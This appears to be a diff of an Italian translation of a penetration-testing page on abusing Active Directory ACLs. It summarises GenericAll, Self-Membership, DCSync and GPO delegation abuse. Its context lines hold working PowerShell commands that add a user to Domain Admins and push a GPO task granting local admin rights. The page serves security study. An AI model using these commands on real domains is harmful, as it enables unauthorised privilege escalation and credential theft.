@@ -4,7 +4,7 @@
 
 **Questa pagina è principalmente un riepilogo delle tecniche da** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **e** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Per ulteriori dettagli, controlla gli articoli originali.**
 
-## **Diritti GenericAll su un Utente**
+## **Diritti GenericAll su Utente**
 
 Questo privilegio concede a un attaccante il pieno controllo su un account utente target. Una volta confermati i diritti `GenericAll` utilizzando il comando `Get-ObjectAcl`, un attaccante può:
 
@@ -44,9 +44,9 @@ Se un utente ha diritti `WriteProperty` su tutti gli oggetti per un gruppo speci
 ```powershell
 net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
 ```
-## **Self (Auto-Membership) su Gruppo**
+## **Self (Self-Membership) on Group**
 
-Questo privilegio consente agli attaccanti di aggiungersi a gruppi specifici, come `Domain Admins`, attraverso comandi che manipolano direttamente l'appartenenza al gruppo. Utilizzando la seguente sequenza di comandi è possibile l'auto-aggiunta:
+Questo privilegio consente agli attaccanti di aggiungersi a gruppi specifici, come `Domain Admins`, attraverso comandi che manipolano direttamente l'appartenenza ai gruppi. Utilizzando la seguente sequenza di comandi è possibile aggiungersi:
 ```powershell
 net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
 ```
@@ -106,7 +106,7 @@ $ADSI.psbase.commitchanges()
 ```
 ## **Replica sul Dominio (DCSync)**
 
-L'attacco DCSync sfrutta specifici permessi di replica sul dominio per mimare un Domain Controller e sincronizzare dati, inclusi le credenziali degli utenti. Questa potente tecnica richiede permessi come `DS-Replication-Get-Changes`, consentendo agli attaccanti di estrarre informazioni sensibili dall'ambiente AD senza accesso diretto a un Domain Controller. [**Scopri di più sull'attacco DCSync qui.**](../dcsync.md)
+L'attacco DCSync sfrutta specifici permessi di replica sul dominio per mimare un Domain Controller e sincronizzare i dati, inclusi le credenziali degli utenti. Questa potente tecnica richiede permessi come `DS-Replication-Get-Changes`, consentendo agli attaccanti di estrarre informazioni sensibili dall'ambiente AD senza accesso diretto a un Domain Controller. [**Scopri di più sull'attacco DCSync qui.**](../dcsync.md)
 
 ## Delegazione GPO <a href="#gpo-delegation" id="gpo-delegation"></a>
 
@@ -130,7 +130,7 @@ I GPO mal configurati possono essere sfruttati per eseguire codice, ad esempio, 
 ```powershell
 New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
 ```
-### GroupPolicy module - Abuse GPO
+### GroupPolicy module - Abuso di GPO
 
 Il modulo GroupPolicy, se installato, consente la creazione e il collegamento di nuovi GPO, e la configurazione di preferenze come valori di registro per eseguire backdoor sui computer interessati. Questo metodo richiede che il GPO venga aggiornato e che un utente acceda al computer per l'esecuzione:
 ```powershell
